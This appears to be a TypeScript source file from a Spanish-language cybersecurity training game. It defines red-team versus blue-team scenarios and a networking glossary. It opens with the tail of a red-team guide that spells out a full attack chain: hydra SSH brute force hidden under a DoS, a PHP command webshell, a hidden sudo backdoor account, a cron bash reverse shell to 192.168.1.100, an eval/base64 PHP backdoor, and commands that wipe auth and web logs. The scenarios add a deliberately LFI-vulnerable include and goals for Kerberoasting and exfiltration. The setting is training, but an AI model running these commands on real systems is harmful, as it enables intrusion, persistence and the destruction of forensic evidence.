bash# 1. En una NUEVA terminal (no cierres la del DoS)
# Ataque de fuerza bruta contra admin
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://PORTAL-WEB -t 16 -V

# Opciones explicadas:
# -l admin: usuario objetivo
# -P rockyou.txt: lista de contraseñas
# -t 16: 16 threads (paralelismo)
# -V: verbose (ver cada intento)

# 2. Cuando encuentre la contraseña, verás:
# [22][ssh] host: PORTAL-WEB login: admin password: P@ssw0rd
Estrategia:

El DoS hace que el monitoreo sea difícil
Los logs se llenan de eventos del DoS
El bruteforce se "esconde" en el ruido
Ventana de tiempo: ~5-10 minutos antes de detección

Puntos ganados: 30
Fase 4: Acceso y Despliegue de Backdoor
Una vez que tienes credenciales, actúa RÁPIDO.
bash# 1. Detener el ataque DoS (Ctrl+C en esa terminal)

# 2. Conectar vía SSH inmediatamente
ssh admin@PORTAL-WEB
# Contraseña: P@ssw0rd (la que encontró hydra)

# 3. Verificar acceso
whoami  # admin
id      # ver grupos

# 4. Desplegar webshell simple
cat > /var/www/html/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
EOF

# 5. Verificar que funciona
curl "http://PORTAL-WEB/shell.php?cmd=whoami"
# Debería retornar: www-data

# 6. Modificar index.php para demostrar compromiso
cp /var/www/html/index.php /tmp/index.php.bak
cat > /var/www/html/index.php << 'EOF'
<?php
echo "<!DOCTYPE html><html><body style='background-color:black; color:red;'>";
echo "<h1>🔥 PORTAL-WEB COMPROMISED 🔥</h1>";
echo "<p>Red Team was here</p>";
echo "<p style='font-size:10px;'>Timestamp: " . date('Y-m-d H:i:s') . "</p>";
echo "</body></html>";
?>
EOF

# 7. Verificar
curl http://PORTAL-WEB
Puntos ganados: 35
Fase 5: Persistencia Avanzada
Asegura que mantendrás acceso incluso si detectan y bloquean.
Método 1: Cuenta Backdoor
bash# 1. Crear usuario oculto del sistema
sudo useradd -m -s /bin/bash .update-daemon

# 2. Dar privilegios sudo
sudo usermod -aG sudo .update-daemon

# 3. Establecer contraseña
echo ".update-daemon:Backd00rP@ss" | sudo chpasswd

# 4. Ocultar el usuario (opcional)
# Editar /etc/passwd para que no aparezca en 'who'
Método 2: Cronjob Reverse Shell
bash# 1. Crear script de reverse shell
cat > /tmp/.system-update.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
EOF

chmod +x /tmp/.system-update.sh

# 2. Agregar al crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.system-update.sh") | crontab -

# 3. En tu Kali, listener:
nc -lvnp 4444
Método 3: SSH Key Backdoor
bash# 1. En tu Kali, generar clave
ssh-keygen -t rsa -b 4096 -f ~/.ssh/portal_backdoor -N ""

# 2. Copiar clave pública al servidor
# (Estando conectado como admin)
mkdir -p ~/.ssh
cat >> ~/.ssh/authorized_keys << 'EOF'
ssh-rsa AAAAB3NzaC... tu-clave-publica-aqui
EOF
chmod 600 ~/.ssh/authorized_keys

# 3. Ahora puedes conectar sin contraseña
ssh -i ~/.ssh/portal_backdoor admin@PORTAL-WEB
Método 4: Backdoor en Módulo PHP
bash# 1. Crear backdoor más sofisticado
cat > /var/www/html/media/cache/.system.php << 'EOF'
<?php
if(md5($_GET['auth']) == 'e10adc3949ba59abbe56e057f20f883e'){
    eval(base64_decode($_POST['cmd']));
}
?>
EOF

# 2. Uso:
# La contraseña es: 123456 (MD5: e10adc3949ba59abbe56e057f20f883e)
# URL: http://PORTAL-WEB/media/cache/.system.php?auth=123456
# POST data: cmd=base64_encoded_command
Puntos ganados: 15 (bonus por persistencia)
Fase 6: Limpieza de Rastros (Avanzado)
Dificulta la investigación forense.
bash# 1. Limpiar logs de autenticación
sudo truncate -s 0 /var/log/auth.log

# O más selectivo:
sudo sed -i '/admin/d' /var/log/auth.log

# 2. Limpiar historial de bash
history -c
rm ~/.bash_history
ln -s /dev/null ~/.bash_history

# 3. Limpiar logs web
sudo truncate -s 0 /var/log/nginx/access.log
sudo truncate -s 0 /var/log/nginx/error.log

# 4. Modificar timestamps de archivos
touch -r /etc/passwd /var/www/html/shell.php
⚠️ Nota Ética: Esta fase es solo para entrenamiento. En un pentest real, NUNCA borres logs sin autorización explícita.
Puntos ganados: 5 (bonus por evasión)
Checklist de Ataque - Equipo Rojo

 DoS lanzado exitosamente (CPU > 90%)
 Bruteforce ejecutado durante el DoS
 Credenciales de admin obtenidas
 Acceso SSH conseguido
 Webshell desplegado
 index.php modificado (hash diferente)
 Al menos un método de persistencia implementado
 Rastros parcialmente limpiados (opcional)
`;

export const GLOSSARY_TERMS: GlossaryTerm[] = [
    { term: "Dirección IP (IPv4/IPv6)", definition: "Identificador numérico único para dispositivos en una red. (Ver: Guía IP, Fundamentos)" },
    { term: "Modelo OSI", definition: "Modelo teórico de 7 capas (Física, Enlace, Red, Transporte, Sesión, Presentación, Aplicación) para entender la comunicación de redes. (Ver: Protocolos, Fundamentos)" },
    { term: "Modelo TCP/IP", definition: "Modelo práctico de 4 capas (Acceso a Red, Internet, Transporte, Aplicación) sobre el que funciona Internet. (Ver: Protocolos, Fundamentos)" },
    { term: "Protocolo", definition: "Conjunto de reglas que definen cómo se comunican los dispositivos. (Ver: Fundamentos, Protocolos)" },
    { term: "TCP (Protocolo de Control de Transmisión)", definition: "Protocolo de Capa 4, fiable y orientado a conexión (como correo certificado). (Ver: Fundamentos, Protocolos)" },
    { term: "UDP (Protocolo de Datagramas de Usuario)", definition: "Protocolo de Capa 4, rápido y no fiable (como tarjeta postal). (Ver: Fundamentos, Protocolos)" },
    { term: "Puerto de Red", definition: "Identificador numérico (0-65535) que dirige el tráfico a una aplicación específica en un dispositivo. (Ver: Fundamentos)" },
    { term: "Socket", definition: "Combinación de una Dirección IP y un Puerto, creando un punto final de comunicación único (ej. 192.168.1.1:443). (Ver: Fundamentos)" },
    { term: "DNS (Sistema de Nombres de Dominio)", definition: "La \"agenda telefónica\" de Internet. Traduce nombres de dominio (cybervaltorix.com) a direcciones IP. (Ver: Recursos)" },
    { term: "NetID y HostID", definition: "Las dos partes de una IP: el NetID identifica la red y el HostID identifica al dispositivo en esa red. (Ver: Recursos)" },
    { term: "IP Pública vs. Privada", definition: "Pública (única en Internet) vs. Privada (reutilizable en redes locales, ej. 192.168.x.x). (Ver: Recursos)" },
    { term: "NAT (Network Address Translation)", definition: "Permite a múltiples dispositivos en una red privada compartir una única IP pública. (Ver: Recursos)" },
    { term: "Subnetting (Subredes)", definition: "Técnica de dividir una red grande en redes más pequeñas (subredes) para mejorar la organización y seguridad. (Ver: Recursos)" },
    { term: "Máscara de Subred", definition: "Número (ej. 255.255.255.0 o /24) que define qué porción de una IP es el NetID y qué porción es el HostID. (Ver: Recursos)" },
    { term: "VLSM (Máscara de Subred de Longitud Variable)", definition: "Técnica avanzada de subnetting que permite crear subredes de diferentes tamaños para maximizar la eficiencia de IPs. (Ver: Recursos)" },
    { term: "Encapsulación", definition: "Proceso de \"envolver\" datos con encabezados de control a medida que bajan por las capas del modelo de red. (Ver: Recursos)" },
    { term: "PDU (Unidad de Datos de Protocolo)", definition: "El nombre genérico de los \"datos\" en cada capa: Trama (Capa 2), Paquete (Capa 3), Segmento/Datagrama (Capa 4). (Ver: Recursos)" },
];

export const fortressScenario: InteractiveScenario = {
    id: 'escenario7',
    isInteractive: true,
    icon: 'shield-check',
    color: 'bg-indigo-500',
    title: 'Fortaleza Digital (Hardening vs. Pentest)',
    subtitle: 'Equipo Rojo vs. Equipo Azul - Simulación Interactiva',
    description: 'Rojo debe comprometer el servidor BOVEDA-WEB. Azul debe asegurarlo antes de que sea demasiado tarde. Tiempo estimado: 45 mins.',
    difficulty: 'intermediate',
    team: 'both',
    initialEnvironment: {
        networks: {
            'dmz': {
                hosts: [{
                    ip: '10.0.10.5',
                    hostname: 'BOVEDA-WEB',
                    os: 'linux',
                    services: {
                        22: { name: 'ssh', version: 'OpenSSH 7.4', state: 'open', vulnerabilities: [] },
                        80: { name: 'http', version: 'Apache 2.4.6', state: 'open', vulnerabilities: [] },
                        443: { name: 'https', version: 'Apache 2.4.6', state: 'open', vulnerabilities: [] },
                        3306: { name: 'mysql', version: 'MySQL 5.5.62', state: 'open', vulnerabilities: [] },
                    },
                    users: [
                        { username: 'root', password: 'toor', privileges: 'root' },
                        { username: 'admin', password: 'complex_password_!@#$', privileges: 'admin' },
                        { username: 'blue-team', password: 'Bl#3T3@m!2024', privileges: 'admin' },
                    ],
                    files: [
                        { path: '/var/log/auth.log', permissions: '640', content: '# Authentication log file\n', hash: 'auth_log_initial' },
                        { path: '/var/www/html/index.php', permissions: '644', content: '<?php echo "<h1>BOVEDA-WEB v1.0</h1>"; ?>', hash: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4' },
                        { path: '/var/www/html/backup/db_config.php.bak', permissions: '644', content: '<?php\n$db_host = "localhost";\n$db_user = "root";\n$db_pass = "mysql_root_pass";\n$db_name = "production_db";\n?>', hash: 'backup_config_hash' },
                        { path: '/var/www/html/db_config.php', permissions: '644', content: '<?php\n$db_host = "localhost";\n$db_user = "root";\n$db_pass = "mysql_root_pass";\n$db_name = "production_db";\n?>', hash: 'db_config_hash' },
                        { path: '/etc/ssh/sshd_config', permissions: '600', content: '... PermitRootLogin yes ...', hash: 'sshd_config_hash_7' },
                    ],
                    systemState: { cpuLoad: 5.0, memoryUsage: 25.0, networkConnections: 15, failedLogins: 0 }
                }],
                firewall: { enabled: false, rules: [] },
                ids: { enabled: true, signatures: ['SSH_BRUTEFORCE'], alerts: [] }
            }
        },
        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
        timeline: []
    },
    objectives: [
        // === EQUIPO AZUL ===
        { id: 'blue-firewall-check', description: 'Diagnóstico: Verificar estado del firewall UFW', points: 5, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('ufw status'))},
        { id: 'blue-firewall-activate', description: 'Activar UFW con reglas SSH, HTTP, HTTPS (Bloquear 3306)', points: 20, required: true, validator: (env) => {
            const fw = env.networks.dmz.firewall;
            const allowedPorts = fw.rules.filter(r => r.action === 'allow').map(r => r.destPort);
            const sshAllowed = allowedPorts.includes(22);
            const mysqlAllowed = allowedPorts.includes(3306);
            return fw.enabled && sshAllowed && !mysqlAllowed;
        }, hint: '¡CRÍTICO! Permite SSH (22) PRIMERO o te quedarás bloqueado. Luego HTTP (80) y HTTPS (443).'},
        { id: 'blue-ssh-hardening', description: 'Endurecer SSH: Deshabilitar login directo de root', points: 15, required: true, validator: (env) => !!env.networks.dmz.hosts[0].files.find(f => f.path === '/etc/ssh/sshd_config')?.content?.includes('PermitRootLogin no'), hint: 'Edita /etc/ssh/sshd_config y cambia PermitRootLogin a "no". Reinicia sshd.'},
        { id: 'blue-file-permissions-check', description: 'Identificar archivos con permisos inseguros (644)', points: 5, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('ls -l'))},
        { id: 'blue-file-permissions-fix', description: 'Asegurar permisos de db_config.php (640)', points: 15, required: true, validator: (env) => {
            const file = env.networks.dmz.hosts[0].files.find(f => f.path === '/var/www/html/db_config.php');
            return file ? parseInt(file.permissions) <= 640 : false;
        }, hint: 'Usa chmod 640 para quitar permisos de lectura a "otros".'},
        { id: 'blue-monitoring-setup', description: 'Monitoreo activo: Analizar logs de autenticación', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('tail') || log.message.includes('grep')) && log.message.includes('auth.log'))},

        // === EQUIPO ROJO ===
        { id: 'red-reconnaissance-nmap', description: 'Reconocimiento: Escanear puertos y servicios (Nmap)', points: 10, required: true, validator: (env) => env.attackProgress.reconnaissance.includes('10.0.10.5')},
        { id: 'red-web-enumeration', description: 'Enumeración Web: Descubrir directorios ocultos (dirb)', points: 5, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('dirb'))},
        { id: 'red-backup-exfiltration', description: 'Exfiltración: Obtener credenciales de backup expuesto', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('curl') && log.message.includes('backup'))},
        { id: 'red-bruteforce-ssh', description: 'Acceso Inicial: Fuerza bruta contra SSH (Hydra)', points: 25, required: true, validator: (env) => !!env.attackProgress.credentials['root@10.0.10.5'], hint: 'Usa hydra contra el usuario root. La contraseña es débil.'},
        { id: 'red-ssh-access', description: 'Compromiso: Acceder al servidor via SSH', points: 20, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.10.5')},
        { id: 'red-file-exfiltration', description: 'Post-Explotación: Leer archivo de configuración de BD', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('cat') && log.message.includes('db_config.php')) && env.attackProgress.compromised.includes('10.0.10.5')},
        { id: 'red-backdoor-webshell', description: 'Persistencia: Instalar Webshell en index.php', points: 35, required: true, validator: (env) => {
             const index = env.networks.dmz.hosts[0].files.find(f => f.path === '/var/www/html/index.php');
             return index?.hash !== '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4';
        }, hint: 'Modifica index.php para inyectar código PHP malicioso.'},
        { id: 'red-persistence-user', description: '(Bonus) Crear usuario backdoor', points: 10, required: false, validator: (env) => env.networks.dmz.hosts[0].users.some(u => u.username === 'backdoor')},
        { id: 'red-persistence-cron', description: '(Bonus) Persistencia via Cron', points: 5, required: false, validator: (env) => env.attackProgress.persistence.includes('cron_job_set')},
    ],
    hints: [
        { trigger: (env) => !env.networks.dmz.firewall.enabled && env.timeline.length > 10, message: '🚨 [EQUIPO AZUL] ALERTA CRÍTICA: El firewall sigue desactivado. Todos los puertos están expuestos.' },
        { trigger: (env) => env.attackProgress.reconnaissance.includes('10.0.10.5') && !env.networks.dmz.firewall.enabled, message: '⚠️ [EQUIPO AZUL] Escaneo detectado. Activa el firewall AHORA.' },
        { trigger: (env) => (env.networks.dmz.hosts[0].systemState?.failedLogins ?? 0) > 10, message: '🚨 [EQUIPO AZUL] Ataque de fuerza bruta masivo en SSH. Revisa /var/log/auth.log.' },
        { trigger: (env) => !!env.attackProgress.credentials['root@10.0.10.5'] && !env.attackProgress.compromised.includes('10.0.10.5'), message: '💡 [EQUIPO ROJO] Tienes las credenciales. Conéctate ahora: ssh root@BOVEDA-WEB' },
    ],
    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
};

const calculateResponseTime = (env: VirtualEnvironment): string => {
    const attackLog = env.timeline.find(log => log.message.includes('hydra') || log.message.includes('hping3'));
    const defenseLog = env.timeline.find(log => log.message.includes('ufw deny from') || log.message.includes('fail2ban-client'));

    if (attackLog && defenseLog) {
        const attackTime = new Date(attackLog.timestamp).getTime();
        const defenseTime = new Date(defenseLog.timestamp).getTime();
        const diffSeconds = (defenseTime - attackTime) / 1000;
        return `${Math.max(0, diffSeconds).toFixed(1)}s`;
    }
    return 'N/A';
};

export const rageScenario: InteractiveScenario = {
    id: 'escenario8',
    isInteractive: true,
    icon: 'bomb',
    color: 'bg-orange-600',
    title: 'Furia en la Red: Ataque Combinado',
    subtitle: 'DoS + Bruteforce Simultáneos',
    description: 'Alerta crítica: PORTAL-WEB reporta timeout. Tráfico anómalo detectado. Azul debe priorizar y contener. Tiempo estimado: 60 mins.',
    difficulty: 'advanced',
    team: 'both',
    
    initialEnvironment: {
        networks: {
            'dmz': {
                hosts: [{
                    ip: '10.0.20.10',
                    hostname: 'PORTAL-WEB',
                    os: 'linux',
                    services: {
                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
                        80: { name: 'http', version: 'nginx 1.18', state: 'open', vulnerabilities: [] },
                        443: { name: 'https', version: 'nginx 1.18', state: 'open', vulnerabilities: [] }
                    },
                    users: [
                        { username: 'admin', password: 'P@ssw0rd', privileges: 'admin' },
                        { username: 'blue-team', password: 'Bl#3T3@m!2024', privileges: 'admin' }
                    ],
                    files: [
                        { path: '/var/www/html/index.php', permissions: '644', content: '<?php echo "PORTAL-WEB v1.0"; ?>', hash: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4' },
                        { path: '/var/log/auth.log', permissions: '640', content: '', hash: 'auth_log_initial' }
                    ],
                    systemState: {
                        cpuLoad: 5.0,
                        memoryUsage: 30.0,
                        networkConnections: 50,
                        failedLogins: 0
                    }
                }],
                firewall: {
                    enabled: true,
                    rules: [
                        { id: '1', action: 'allow', protocol: 'tcp', destPort: 22 },
                        { id: '2', action: 'allow', protocol: 'tcp', destPort: 80 },
                        { id: '3', action: 'allow', protocol: 'tcp', destPort: 443 }
                    ]
                },
                ids: {
                    enabled: true,
                    signatures: ['SSH_BRUTEFORCE', 'SYN_FLOOD', 'HTTP_DOS'],
                    alerts: []
                }
            }
        },
        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
        timeline: []
    },
    
    objectives: [
        // === EQUIPO AZUL ===
        { id: 'blue-dos-detection', description: 'Diagnóstico: Identificar DoS (CPU > 90%)', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('top') || log.message.includes('htop'))), hint: 'Usa "top" o "htop" para diagnosticar la lentitud.'},
        { id: 'blue-identify-source', description: 'Investigación: Identificar IP del atacante', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('netstat') || log.message.includes('ss '))), hint: 'Usa "ss -ant" o "netstat" para ver conexiones masivas.'},
        { id: 'blue-bruteforce-detection', description: 'Detección: Descubrir ataque SSH paralelo en logs', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('tail') || log.message.includes('grep') || log.message.includes('journalctl')) && (log.message.includes('auth.log') || log.message.includes('sshd'))), hint: 'El DoS es una distracción. Revisa /var/log/auth.log.'},
        { id: 'blue-block-attacker', description: 'Contención: Bloquear IP atacante (Detiene DoS y SSH)', points: 25, required: true, validator: (env) => env.defenseProgress.blockedIPs.includes('192.168.1.100'), hint: 'Bloquea la IP 192.168.1.100 usando UFW.'},
        { id: 'blue-verify-compromise', description: 'Evaluación de Daños: Verificar sesiones activas', points: 15, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('who') || log.message.includes('w '))), hint: 'Usa "who" o "w" para ver si el atacante sigue conectado.'},
        { id: 'blue-file-integrity', description: 'Integridad: Verificar archivos web (backdoor)', points: 20, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('sha256sum') || log.message.includes('md5sum'))), hint: 'Verifica el hash de index.php.'},
        { id: 'blue-eradication', description: 'Erradicación: Restaurar sistema y eliminar backdoors', points: 25, required: true, validator: (env) => {
             const index = env.networks.dmz.hosts[0].files.find(f => f.path === '/var/www/html/index.php');
             return index?.hash === '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4';
        }},
        { id: 'blue-fail2ban', description: '(Bonus) Instalar Fail2Ban', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('systemctl restart fail2ban'))},

        // === EQUIPO ROJO ===
        { id: 'red-dos-launch', description: 'Distracción: Lanzar DoS (Hping3)', points: 20, required: true, validator: (env) => (env.networks.dmz.hosts[0]?.systemState?.cpuLoad ?? 0) > 90, hint: 'Usa hping3 con flag --flood -S para saturar el servidor.'},
        { id: 'red-bruteforce-parallel', description: 'Infiltración: Fuerza bruta paralela (mientras DoS activo)', points: 30, required: true, validator: (env) => !!env.attackProgress.credentials['admin@10.0.20.10'], hint: 'Aprovecha el caos. Lanza hydra mientras el DoS corre.'},
        { id: 'red-ssh-access', description: 'Acceso: Entrar como admin', points: 15, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.20.10'), hint: 'ssh admin@PORTAL-WEB usando la contraseña obtenida.'},
        { id: 'red-webshell-deploy', description: 'Persistencia: Desplegar Webshell/Backdoor', points: 35, required: true, validator: (env) => env.attackProgress.persistence.includes('webshell') || env.attackProgress.persistence.includes('index_modified'), hint: 'Crea un archivo PHP malicioso o modifica index.php.'},
        { id: 'red-persistence-advanced', description: '(Bonus) Múltiple persistencia (User/Cron)', points: 15, required: false, validator: (env) => env.attackProgress.persistence.length >= 2},
        { id: 'red-cover-tracks', description: '(Bonus) Limpiar logs', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('echo') && log.message.includes('auth.log'))},
    ],
    
    hints: [
        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.cpuLoad ?? 0) > 90, message: '🚨 [EQUIPO AZUL] CPU crítica (99%). Servicio web no responde. ¿Ataque DoS?' },
        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.failedLogins ?? 0) > 20, message: '🚨 [EQUIPO AZUL] Múltiples fallos de SSH detectados en logs. ¡El DoS es una distracción!' },
        { trigger: (env) => {
            const hasCredentials = !!env.attackProgress.credentials['admin@10.0.20.10'];
            const isBlocked = env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
            return hasCredentials && !isBlocked;
          }, message: '⚠️ [EQUIPO AZUL] Credenciales comprometidas y atacante NO bloqueado. Situación crítica.'
        },
        { trigger: (env) => !!env.attackProgress.credentials['admin@10.0.20.10'] && !env.attackProgress.compromised.includes('10.0.20.10'), message: '💡 [EQUIPO ROJO] Contraseña obtenida. Entra rápido antes de que te bloqueen.' },
    ],
    
    evaluation: (env) => {
        const redPoints = rageScenario.objectives.filter(o => o.id.startsWith('red-') && (o as any).validator(env)).reduce((sum, o) => sum + o.points, 0);
        const bluePoints = rageScenario.objectives.filter(o => o.id.startsWith('blue-') && (o as any).validator(env)).reduce((sum, o) => sum + o.points, 0);
        
        const feedback: string[] = [];
        const isCompromised = env.attackProgress.compromised.includes('10.0.20.10');
        const isBlocked = env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
        
        if (isCompromised && !isBlocked) {
            feedback.push('⚔️ **VICTORIA DECISIVA DEL EQUIPO ROJO**: Servidor comprometido y persistencia establecida.');
        } else if (isBlocked && !isCompromised) {
            feedback.push('🛡️ **VICTORIA DEL EQUIPO AZUL**: Ataque mitigado antes del compromiso.');
        } else if (isCompromised && isBlocked) {
            feedback.push('⚖️ **EMPATE TÁCTICO**: Rojo entró, pero Azul lo contuvo eventualmente.');
        } else {
            feedback.push('📊 **ESCENARIO EN PROGRESO**');
        }
        feedback.push(`\n**Puntuación Final:** Rojo ${redPoints} | Azul ${bluePoints}`);
        if (isBlocked) {
            feedback.push(`✓ Tiempo de respuesta (Bloqueo): ${calculateResponseTime(env)}`);
        }
        return { completed: redPoints >= 70 || bluePoints >= 60, score: Math.max(redPoints, bluePoints), feedback };
    }
};

export const killChainScenario: InteractiveScenario = {
    id: 'escenario9',
    isInteractive: true,
    icon: 'crosshair',
    color: 'bg-red-800',
    title: 'La Cadena de Infección (Kill Chain)',
    subtitle: 'Ataque multi-fase desde la DMZ hasta la red interna.',
    description: 'El Equipo Rojo debe ejecutar una "Kill Chain" completa, desde la explotación web hasta la exfiltración de datos. El Equipo Azul debe cazar y contener la amenaza en cada fase.',
    difficulty: 'advanced',
    team: 'both',
    initialEnvironment: {
        networks: {
            'dmz': {
                hosts: [{
                    ip: '10.0.0.10',
                    hostname: 'WEB-DMZ-01',
                    os: 'linux',
                    services: {
                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
                        80: { name: 'nginx', version: '1.18', state: 'open', vulnerabilities: [{cve: 'CVE-2013-4547', description: 'LFI Vulnerability', severity: 'high'}] },
                    },
                    users: [{ username: 'blue-team', password: 'Blu3T34mDMZ!2024', privileges: 'admin' }],
                    files: [{ path: '/var/www/html/view.php', permissions: '644', content: '<?php include($_GET["file"]); ?>', hash: 'lfi_vuln_hash' }]
                }],
                firewall: { enabled: true, rules: [{id: 'allow-ssh', action: 'allow', protocol: 'tcp', destPort: 22}, {id: 'allow-http', action: 'allow', protocol: 'tcp', destPort: 80}] },
                ids: { enabled: true, signatures: ['LFI_ATTEMPT', 'REVERSE_SHELL'], alerts: [] }
            },
            'internal': {
                hosts: [{
                    ip: '10.10.0.50',
                    hostname: 'DB-FINANCE-01',
                    os: 'linux',
                    services: { 
                        22: { name: 'ssh', version: 'OpenSSH 8.2', state: 'open', vulnerabilities: [] },
                        3306: { name: 'mysql', version: '8.0', state: 'open', vulnerabilities: [] }
                    },
                    users: [{ username: 'root', password: 'DbP@ss2024!', privileges: 'root' }],
                    files: [{ path: '/db/finance_backup.sql', permissions: '600', content: 'CREDIT_CARD_DATA_HERE', hash: 'finance_db_hash' }]
                }],
                firewall: { enabled: true, rules: [] },
                ids: { enabled: false, signatures: [], alerts: [] }
            }
        },
        attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
        timeline: []
    },
    objectives: [
        { id: 'red-lfi', description: 'Explotar LFI para leer /etc/passwd en WEB-DMZ-01', points: 15, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('/etc/passwd')) },
        { id: 'red-rce', description: 'Obtener ejecución remota de código en WEB-DMZ-01', points: 25, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.0.10')},
        { id: 'red-pivot', description: 'Acceder a DB-FINANCE-01 desde el servidor DMZ', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.10.0.50')},
        { id: 'red-exfiltrate', description: 'Exfiltrar el archivo finance_backup.sql', points: 35, required: true, validator: (env) => env.attackProgress.persistence.includes('data_exfiltrated') },
        
        { id: 'blue-detect-lfi', description: 'Detectar el intento de LFI en los logs de Nginx', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('grep') && log.message.includes('../../')) },
        { id: 'blue-contain-dmz', description: 'Contener la amenaza en WEB-DMZ-01 (bloquear IP, matar shell)', points: 25, required: true, validator: (env) => env.defenseProgress.blockedIPs.length > 0 },
        { id: 'blue-detect-pivot', description: 'Detectar el intento de pivoteo a la red interna', points: 30, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('tcpdump -i eth1')) },
        { id: 'blue-segment-network', description: 'Bloquear el acceso de la DMZ a la red interna', points: 20, required: true, validator: (env) => env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '10.0.0.10') },
    ],
    hints: [
        { trigger: (env) => env.timeline.some(log => log.message.includes('/etc/passwd')), message: '🚨 [EQUIPO AZUL] Intento de LFI detectado. Investiga los logs de Nginx y el proceso www-data inmediatamente.' },
        { trigger: (env) => env.attackProgress.compromised.includes('10.0.0.10'), message: '💡 [EQUIPO ROJO] Estás dentro. Enumera las interfaces de red. ¿Hay una red interna a la que puedas pivotar?' },
    ],
    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
};

export const adEscalationScenario: InteractiveScenario = {
    id: 'escenario10',
    isInteractive: true,
    icon: 'key',
    color: 'bg-yellow-600',
    title: 'La Escalada del Dominio (Active Directory)',
    subtitle: "Ataque de Kerberoasting y Movimiento Lateral en 'cybervaltorix.local'.",
    description: 'Desde un usuario de bajos privilegios, el Equipo Rojo debe escalar a Administrador de Dominio. El Equipo Azul debe proteger y monitorear Active Directory.',
    difficulty: 'advanced',
    team: 'both',
    initialEnvironment: {
        networks: {
            'corp': {
                hosts: [
                    {
                        ip: '10.10.0.5', hostname: 'DC-01', os: 'windows',
                        services: { 389: { name: 'ldap', version: 'AD', state: 'open', vulnerabilities: [] } },
                        users: [
                            { username: 'Administrator', password: 'AdminP@ssw0rd!2024', privileges: 'root'},
                            { username: 'svc_sql', password: 'SqlP@ssw0rd123', privileges: 'admin' },
                            { username: 'pasante-red', password: 'Password123', privileges: 'user'},
                        ],
                        files: []
                    },
                    {
                        ip: '10.10.0.20', hostname: 'WKSTN-07', os: 'windows',
                        services: { 3389: { name: 'rdp', version: '10.0', state: 'open', vulnerabilities: [] } },
                        users: [{ username: 'pasante-red', password: 'Password123', privileges: 'user' }],
                        files: []
                    }
                ],
                firewall: { enabled: true, rules: [] },
                ids: { enabled: true, signatures: ['KERBEROASTING_RC4'], alerts: [] }
            }
        },
        attackProgress: { reconnaissance: [], compromised: ['10.10.0.20'], credentials: {}, persistence: [] },
        defenseProgress: { hardenedHosts: [], blockedIPs: [], patchedVulnerabilities: [] },
        timeline: []
    },
    objectives: [
        { id: 'red-kerberoast', description: "Ejecutar un ataque de Kerberoasting y obtener el hash TGS de 'svc_sql'", points: 30, required: true, validator: (env) => env.attackProgress.credentials['svc_sql_hash'] === '$krb5tgs$23$*...' },
        { id: 'red-crack-hash', description: "Crackear el hash de 'svc_sql' para obtener la contraseña en texto plano", points: 20, required: true, validator: (env) => env.attackProgress.credentials['svc_sql@10.10.0.5'] === 'SqlP@ssw0rd123'},
        { id: 'red-domain-admin', description: 'Comprometer el Domain Controller (DC-01) y obtener privilegios de Domain Admin', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.10.0.5') },
        
        { id: 'blue-detect-kerberoast', description: 'Detectar el ataque de Kerberoasting monitoreando eventos de seguridad (ID 4769)', points: 20, required: true, validator: (env) => env.defenseProgress.patchedVulnerabilities.includes('kerberoast_detected') },
        { id: 'blue-secure-account', description: "Asegurar la cuenta 'svc_sql' (deshabilitar, resetear contraseña fuerte)", points: 20, required: true, validator: (env) => env.defenseProgress.hardenedHosts.includes('svc_sql_secured')},
